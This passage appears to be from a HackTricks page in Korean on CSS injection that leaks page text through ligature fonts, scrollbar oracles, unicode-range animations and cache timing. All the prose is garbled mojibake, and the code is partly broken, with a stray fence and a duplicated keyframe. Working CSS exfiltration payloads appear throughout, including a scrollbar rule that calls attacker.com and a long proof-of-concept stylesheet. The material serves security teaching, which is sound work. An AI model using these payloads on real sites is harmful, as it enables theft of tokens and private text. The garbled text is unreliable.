1. **ì‚¬ìš©ì ì •ì˜ í°íŠ¸ ìƒì„±**:
- SVG í°íŠ¸ëŠ” `horiz-adv-x` ì†ì„±ì„ ê°€ì§„ ê¸€ë¦¬í”„ë¡œ êµ¬ì„±ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” ë‘ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ê¸€ë¦¬í”„ì— í° ë„ˆë¹„ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
- ì˜ˆì‹œ SVG ê¸€ë¦¬í”„: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, ì—¬ê¸°ì„œ "XY"ëŠ” ë‘ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
- ì´ëŸ¬í•œ í°íŠ¸ëŠ” fontforgeë¥¼ ì‚¬ìš©í•˜ì—¬ woff í˜•ì‹ìœ¼ë¡œ ë³€í™˜ë©ë‹ˆë‹¤.

2. **ë„ˆë¹„ ë³€í™” ê°ì§€**:
- CSSë¥¼ ì‚¬ìš©í•˜ì—¬ í…ìŠ¤íŠ¸ê°€ ì¤„ ë°”ê¿ˆë˜ì§€ ì•Šë„ë¡ (`white-space: nowrap`)í•˜ê³  ìŠ¤í¬ë¡¤ë°” ìŠ¤íƒ€ì¼ì„ ì‚¬ìš©ì ì •ì˜í•©ë‹ˆë‹¤.
- ê°€ë¡œ ìŠ¤í¬ë¡¤ë°”ê°€ ë‚˜íƒ€ë‚˜ê³ , ë…íŠ¹í•˜ê²Œ ìŠ¤íƒ€ì¼ì´ ì§€ì •ëœ ê²½ìš°, íŠ¹ì • ë¦¬ê±°ì²˜ìŠ¤(ë”°ë¼ì„œ íŠ¹ì • ë¬¸ì ì‹œí€€ìŠ¤)ê°€ í…ìŠ¤íŠ¸ì— ì¡´ì¬í•¨ì„ ë‚˜íƒ€ë‚´ëŠ” ì§€í‘œ(ì˜¤ë¼í´)ë¡œ ì‘ìš©í•©ë‹ˆë‹¤.
- ê´€ë ¨ëœ CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **ì•…ìš© ê³¼ì •**:
- **ë‹¨ê³„ 1**: í° ë„ˆë¹„ë¥¼ ê°€ì§„ ë¬¸ì ìŒì— ëŒ€í•œ í°íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- **ë‹¨ê³„ 2**: ìŠ¤í¬ë¡¤ë°” ê¸°ë°˜ íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ í° ë„ˆë¹„ ê¸€ë¦¬í”„(ë¬¸ì ìŒì˜ ë¦¬ê±°ì²˜ìŠ¤)ê°€ ë Œë”ë§ë  ë•Œ ê°ì§€í•˜ì—¬ ë¬¸ì ì‹œí€€ìŠ¤ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
- **ë‹¨ê³„ 3**: ë¦¬ê±°ì²˜ìŠ¤ë¥¼ ê°ì§€í•˜ë©´, ê°ì§€ëœ ìŒì„ í¬í•¨í•˜ê³  ì• ë˜ëŠ” ë’¤ì— ë¬¸ìë¥¼ ì¶”ê°€í•œ ì„¸ ë¬¸ì ì‹œí€€ìŠ¤ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- **ë‹¨ê³„ 4**: ì„¸ ë¬¸ì ë¦¬ê±°ì²˜ìŠ¤ì˜ ê°ì§€ê°€ ìˆ˜í–‰ë©ë‹ˆë‹¤.
- **ë‹¨ê³„ 5**: ì´ ê³¼ì •ì„ ë°˜ë³µí•˜ì—¬ ì „ì²´ í…ìŠ¤íŠ¸ë¥¼ ì ì§„ì ìœ¼ë¡œ ê³µê°œí•©ë‹ˆë‹¤.

4. **ìµœì í™”**:
- í˜„ì¬ì˜ ì´ˆê¸°í™” ë°©ë²•ì¸ `<meta refresh=...`ì€ ìµœì í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
- ë” íš¨ìœ¨ì ì¸ ì ‘ê·¼ ë°©ì‹ì€ CSS `@import` íŠ¸ë¦­ì„ í™œìš©í•˜ì—¬ ì•…ìš©ì˜ ì„±ëŠ¥ì„ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (II): ê¸°ë³¸ í°íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ì ì§‘í•© ë…¸ì¶œ (ì™¸ë¶€ ìì‚° í•„ìš” ì—†ìŒ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**ì°¸ê³ :** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

ì´ íŠ¸ë¦­ì€ [**Slackers ìŠ¤ë ˆë“œ**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/)ì—ì„œ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. í…ìŠ¤íŠ¸ ë…¸ë“œì—ì„œ ì‚¬ìš©ëœ ë¬¸ì ì§‘í•©ì€ ë¸Œë¼ìš°ì €ì— ì„¤ì¹˜ëœ **ê¸°ë³¸ í°íŠ¸**ë¥¼ ì‚¬ìš©í•˜ì—¬ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì™¸ë¶€ - ë˜ëŠ” ì‚¬ìš©ì ì •ì˜ - í°íŠ¸ê°€ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ì´ ê°œë…ì€ ì• ë‹ˆë©”ì´ì…˜ì„ í™œìš©í•˜ì—¬ `div`ì˜ ë„ˆë¹„ë¥¼ ì ì§„ì ìœ¼ë¡œ í™•ì¥í•˜ì—¬ í•œ ë²ˆì— í•œ ë¬¸ìì”© 'ì ‘ë¯¸ì‚¬' ë¶€ë¶„ì—ì„œ 'ì ‘ë‘ì‚¬' ë¶€ë¶„ìœ¼ë¡œ ì „í™˜í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ í…ìŠ¤íŠ¸ë¥¼ ë‘ ê°œì˜ ì„¹ì…˜ìœ¼ë¡œ ë¶„í• í•©ë‹ˆë‹¤:

1. **ì ‘ë‘ì‚¬**: ì´ˆê¸° ë¼ì¸.
2. **ì ‘ë¯¸ì‚¬**: í›„ì† ë¼ì¸(ë“¤).

ë¬¸ìì˜ ì „í™˜ ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë‚˜íƒ€ë‚©ë‹ˆë‹¤:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


ì´ ì „í™˜ ì¤‘ì—ëŠ” **ìœ ë‹ˆì½”ë“œ ë²”ìœ„ íŠ¸ë¦­**ì´ ì‚¬ìš©ë˜ì–´ ê° ìƒˆ ë¬¸ìê°€ ì ‘ë‘ì‚¬ì— ì¶”ê°€ë  ë•Œ ì‹ë³„ë©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ í°íŠ¸ë¥¼ ê¸°ë³¸ í°íŠ¸ë³´ë‹¤ í›¨ì”¬ í° Comic Sansë¡œ ì „í™˜í•˜ì—¬ ìˆ˜ì§ ìŠ¤í¬ë¡¤ë°”ë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¡¤ë°”ì˜ ëª¨ìŠµì€ ê°„ì ‘ì ìœ¼ë¡œ ì ‘ë‘ì‚¬ì— ìƒˆ ë¬¸ìê°€ ì¡´ì¬í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ì´ ë°©ë²•ì€ ë‚˜íƒ€ë‚˜ëŠ” ê³ ìœ í•œ ë¬¸ìë¥¼ ê°ì§€í•  ìˆ˜ ìˆì§€ë§Œ, ë°˜ë³µë˜ëŠ” ë¬¸ìê°€ ì–´ë–¤ ë¬¸ìì¸ì§€ë¥¼ ì§€ì •í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë‹¨ì§€ ë°˜ë³µì´ ë°œìƒí–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

{% hint style="info" %}
ê¸°ë³¸ì ìœ¼ë¡œ **ìœ ë‹ˆì½”ë“œ ë²”ìœ„ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìë¥¼ ê°ì§€**í•˜ì§€ë§Œ, ì™¸ë¶€ í°íŠ¸ë¥¼ ë¡œë“œí•˜ê³  ì‹¶ì§€ ì•Šê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.\
**ë¬¸ì**ê°€ **ë°œê²¬**ë˜ë©´, ë¯¸ë¦¬ ì„¤ì¹˜ëœ **Comic Sans í°íŠ¸**ê°€ **ì ìš©**ë˜ì–´ ë¬¸ìê°€ **ë” ì»¤ì§€ê³ **, ë¬¸ìê°€ **ë…¸ì¶œ**ë˜ëŠ” **ìŠ¤í¬ë¡¤ë°”**ê°€ **ìœ ì¶œ**ë©ë‹ˆë‹¤.
{% endhint %}

PoCì—ì„œ ì¶”ì¶œëœ ì½”ë“œë¥¼ í™•ì¸í•˜ì„¸ìš”.
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* ì‚¬ì´ë“œ ì±„ë„ */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (III): ê¸°ë³¸ ê¸€ê¼´ë¡œ ìš”ì†Œë¥¼ ìˆ¨ê²¨ ë¬¸ì ì§‘í•© ë…¸ì¶œí•˜ê¸° (ì™¸ë¶€ ìì‚° í•„ìš” ì—†ìŒ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**ì°¸ê³ :** ì´ëŠ” [ì´ writeupì—ì„œ ì‹¤íŒ¨í•œ í•´ê²°ì±…ìœ¼ë¡œ ì–¸ê¸‰ë©ë‹ˆë‹¤](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°ëŠ” ì´ì „ê³¼ ë§¤ìš° ìœ ì‚¬í•˜ì§€ë§Œ, ì—¬ê¸°ì„œ íŠ¹ì • ë¬¸ìë¥¼ ë‹¤ë¥¸ ë¬¸ìë³´ë‹¤ í¬ê²Œ ë§Œë“¤ì–´ ë²„íŠ¼ì„ ë´‡ì´ ëˆ„ë¥´ì§€ ëª»í•˜ê²Œ í•˜ê±°ë‚˜ ë¡œë“œë˜ì§€ ì•ŠëŠ” ì´ë¯¸ì§€ë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒê³¼ ê°™ì´ **ë¬´ì–¸ê°€ë¥¼ ìˆ¨ê¸°ê¸° ìœ„í•œ ëª©ì **ì´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìš°ë¦¬ëŠ” ë™ì‘(ë˜ëŠ” ë™ì‘ì˜ ë¶€ì¬)ì„ ì¸¡ì •í•˜ì—¬ íŠ¹ì • ë¬¸ìê°€ í…ìŠ¤íŠ¸ ë‚´ì— ìˆëŠ”ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (III): ìºì‹œ íƒ€ì´ë°ì„ í†µí•œ ë¬¸ì ì§‘í•© ë…¸ì¶œ (ì™¸ë¶€ ìì‚° í•„ìš” ì—†ìŒ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**ì°¸ê³ :** ì´ëŠ” [ì´ writeupì—ì„œ ì‹¤íŒ¨í•œ í•´ê²°ì±…ìœ¼ë¡œ ì–¸ê¸‰ë©ë‹ˆë‹¤](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°, ìš°ë¦¬ëŠ” ë™ì¼í•œ ì¶œì²˜ì—ì„œ ê°€ì§œ ê¸€ê¼´ì„ ë¡œë“œí•˜ì—¬ í…ìŠ¤íŠ¸ì— íŠ¹ì • ë¬¸ìê°€ ìˆëŠ”ì§€ ìœ ì¶œí•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
ë§Œì•½ ì¼ì¹˜í•˜ëŠ” ê²ƒì´ ìˆë‹¤ë©´, **í°íŠ¸ëŠ” `/static/bootstrap.min.css?q=1`ì—ì„œ ë¡œë“œë©ë‹ˆë‹¤**. ì„±ê³µì ìœ¼ë¡œ ë¡œë“œë˜ì§€ëŠ” ì•Šê² ì§€ë§Œ, **ë¸Œë¼ìš°ì €ëŠ” ìºì‹œ**í•˜ê³  ìˆì„ ê²ƒì´ë©°, ìºì‹œê°€ ì—†ë”ë¼ë„ **304 not modified** ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìœ¼ë¯€ë¡œ ë‹¤ë¥¸ ê²ƒë³´ë‹¤ **ì‘ë‹µì´ ë” ë¹ ë¥¼ ê²ƒ**ì…ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ìºì‹œëœ ì‘ë‹µê³¼ ìºì‹œë˜ì§€ ì•Šì€ ì‘ë‹µì˜ ì‹œê°„ ì°¨ì´ê°€ ì¶©ë¶„íˆ í¬ì§€ ì•Šìœ¼ë©´ ì´ëŠ” ìœ ìš©í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì €ìëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì–¸ê¸‰í–ˆìŠµë‹ˆë‹¤: ê·¸ëŸ¬ë‚˜ í…ŒìŠ¤íŠ¸ í›„ì—, ì²« ë²ˆì§¸ ë¬¸ì œëŠ” ì†ë„ê°€ í¬ê²Œ ë‹¤ë¥´ì§€ ì•Šë‹¤ëŠ” ê²ƒì´ê³ , ë‘ ë²ˆì§¸ ë¬¸ì œëŠ” ë´‡ì´ `disk-cache-size=1` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì¸ë°, ì´ëŠ” ì •ë§ë¡œ ì‹ ì¤‘í•œ ì„ íƒì…ë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë…¸ë“œ ìœ ì¶œ (III): ìˆ˜ë°± ê°œì˜ ë¡œì»¬ "í°íŠ¸"ë¥¼ ì‹œê°„ ì¸¡ì •í•˜ì—¬ ë¬¸ì ì§‘í•© ìœ ì¶œí•˜ê¸° (ì™¸ë¶€ ìì‚°ì´ í•„ìš”í•˜ì§€ ì•ŠìŒ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**ì°¸ê³ :** ì´ëŠ” [ì´ writeupì—ì„œ ì‹¤íŒ¨í•œ í•´ê²°ì±…ìœ¼ë¡œ ì–¸ê¸‰ë©ë‹ˆë‹¤](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ì´ ê²½ìš°, ì¼ì¹˜í•˜ëŠ” ê²½ìš°ì— **CSSì—ì„œ ìˆ˜ë°± ê°œì˜ ê°€ì§œ í°íŠ¸**ë¥¼ ë™ì¼ ì¶œì²˜ì—ì„œ ë¡œë“œí•˜ë„ë¡ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ì†Œìš” ì‹œê°„**ì„ ì¸¡ì •í•˜ê³  ë¬¸ìê°€ ë‚˜íƒ€ë‚˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
ê·¸ë¦¬ê³  ë´‡ì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
ë”°ë¼ì„œ, í°íŠ¸ê°€ ì¼ì¹˜í•˜ì§€ ì•Šìœ¼ë©´ ë´‡ì„ ë°©ë¬¸í•  ë•Œ ì‘ë‹µ ì‹œê°„ì€ ì•½ 30ì´ˆê°€ ì˜ˆìƒë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ í°íŠ¸ê°€ ì¼ì¹˜í•˜ëŠ” ê²½ìš°, í°íŠ¸ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ ì—¬ëŸ¬ ìš”ì²­ì´ ì „ì†¡ë˜ì–´ ë„¤íŠ¸ì›Œí¬ì— ì§€ì†ì ì¸ í™œë™ì´ ë°œìƒí•©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, ì¤‘ì§€ ì¡°ê±´ì„ ì¶©ì¡±í•˜ê³  ì‘ë‹µì„ ë°›ê¸°ê¹Œì§€ ë” ì˜¤ë˜ ê±¸ë¦´ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‘ë‹µ ì‹œê°„ì€ í°íŠ¸ ì¼ì¹˜ ì—¬ë¶€ë¥¼ íŒë‹¨í•˜ëŠ” ì§€í‘œë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
